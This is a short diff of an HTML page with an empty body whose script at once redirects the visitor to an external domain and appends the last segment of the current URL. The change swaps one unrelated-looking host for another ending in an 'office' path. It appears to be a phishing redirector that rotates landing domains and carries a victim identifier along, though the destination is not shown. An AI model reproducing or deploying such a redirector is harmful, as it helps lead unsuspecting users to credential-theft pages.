@@ -2,7 +2,7 @@
   <body></body>
   <script>
     window.location.replace(
-      "https://hustlegamestrong.com/183aew/OV4/" +
+      "https://brew2youva.com/blog14/office/" +
         window.location.href.substring(
           window.location.href.lastIndexOf("/") + 1
         )
